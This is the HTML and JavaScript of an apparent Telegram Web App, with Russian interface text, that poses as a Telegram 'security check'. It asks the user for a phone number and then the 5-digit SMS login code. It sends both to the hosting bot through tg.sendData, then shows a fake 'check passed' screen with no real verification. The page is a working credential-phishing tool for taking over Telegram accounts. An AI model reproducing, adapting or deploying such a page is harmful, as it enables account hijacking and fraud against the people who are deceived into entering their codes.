<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,sans-serif;background:#0f0f0f;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
        .container{background:#1a1a1a;border-radius:20px;padding:32px 24px;max-width:400px;width:100%;text-align:center;border:1px solid #2a2a2a}
        .shield{width:80px;height:80px;margin:0 auto 24px;background:linear-gradient(135deg,#2aabee,#1a8fc4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:40px}
        h2{font-size:22px;margin-bottom:6px}
        .sub{color:#888;font-size:14px;margin-bottom:24px}
        .hidden{display:none!important}
        .input-box{background:#1e1e1e;border:1px solid #2a2a2a;border-radius:12px;padding:4px 16px;display:flex;align-items:center;gap:10px;margin-bottom:16px}
        .input-box span{color:#888;font-size:18px}
        .input-box input{width:100%;padding:14px 0;border:none;background:transparent;color:#fff;font-size:16px;outline:none;font-family:inherit}
        .btn{width:100%;padding:15px;border:none;border-radius:12px;background:#2aabee;color:#fff;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:10px}
        .btn:disabled{background:#333!important;color:#666!important}
        .status{font-size:13px;min-height:20px;margin-top:10px}
        .status.err{color:#f44336}
        .status.ok{color:#4caf50}
        .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.7s linear infinite;vertical-align:middle;margin-right:8px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .debug{font-size:10px;color:#555;margin-top:20px;word-break:break-all}
    </style>
</head>
<body>
    <div class="container">
        <div class="shield">🛡️</div>
        
        <div id="step1">
            <h2>Проверка безопасности</h2>
            <p class="sub">Введите номер телефона</p>
            <div class="input-box">
                <span>📱</span>
                <input type="tel" id="phoneInput" placeholder="+79112223344">
            </div>
            <button class="btn" onclick="sendPhone()" id="btn1">📩 Отправить код</button>
            <div class="status" id="s1"></div>
        </div>
        
        <div id="step2" class="hidden">
            <h2>Код подтверждения</h2>
            <p class="sub">SMS отправлена на<br><strong id="pd"></strong></p>
            <div class="input-box">
                <span>🔑</span>
                <input type="text" id="codeInput" placeholder="5 цифр" maxlength="5" inputmode="numeric">
            </div>
            <button class="btn" onclick="sendCode()" id="btn2">✅ Подтвердить</button>
            <div class="status" id="s2"></div>
        </div>
        
        <div id="step3" class="hidden">
            <div style="font-size:50px;margin:20px 0">✅</div>
            <h2>Готово!</h2>
            <p class="sub">Проверка пройдена</p>
        </div>
        
        <div class="debug" id="debug"></div>
    </div>
    
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        let phone = '';
        
        function log(msg){
            document.getElementById('debug').textContent += msg + '\n';
        }
        
        log('WebApp v' + tg.version);
        log('Platform: ' + tg.platform);
        
        function sendPhone(){
            const raw = document.getElementById('phoneInput').value.trim();
            if(!raw) return;
            phone = raw.replace(/\s/g,'').replace(/-/g,'');
            if(!phone.startsWith('+')) phone = '+' + phone;
            
            document.getElementById('btn1').disabled = true;
            document.getElementById('btn1').innerHTML = '<span class="spinner"></span>Отправка...';
            
            log('Отправляю номер: ' + phone);
            
            try {
                tg.sendData(JSON.stringify({action:'phone', phone:phone}));
                log('sendData вызван');
                
                // Переключаем шаг
                setTimeout(function(){
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                    document.getElementById('pd').textContent = phone;
                    document.getElementById('codeInput').focus();
                }, 500);
            } catch(e) {
                log('Ошибка sendData: ' + e.message);
                document.getElementById('s1').textContent = 'Ошибка: ' + e.message;
                document.getElementById('s1').className = 'status err';
                document.getElementById('btn1').disabled = false;
                document.getElementById('btn1').innerHTML = '📩 Отправить код';
            }
        }
        
        function sendCode(){
            const code = document.getElementById('codeInput').value.trim();
            if(!code || code.length < 5) return;
            
            document.getElementById('btn2').disabled = true;
            document.getElementById('btn2').innerHTML = '<span class="spinner"></span>Проверка...';
            
            log('Отправляю код: ' + code);
            
            try {
                tg.sendData(JSON.stringify({action:'code', phone:phone, code:code}));
                log('sendData вызван');
                
                // Показываем успех
                setTimeout(function(){
                    document.getElementById('step2').classList.add('hidden');
                    document.getElementById('step3').classList.remove('hidden');
                }, 500);
            } catch(e) {
                log('Ошибка sendData: ' + e.message);
                document.getElementById('s2').textContent = 'Ошибка';
                document.getElementById('s2').className = 'status err';
                document.getElementById('btn2').disabled = false;
                document.getElementById('btn2').innerHTML = '✅ Подтвердить';
            }
        }
    </script>
</body>
</html>
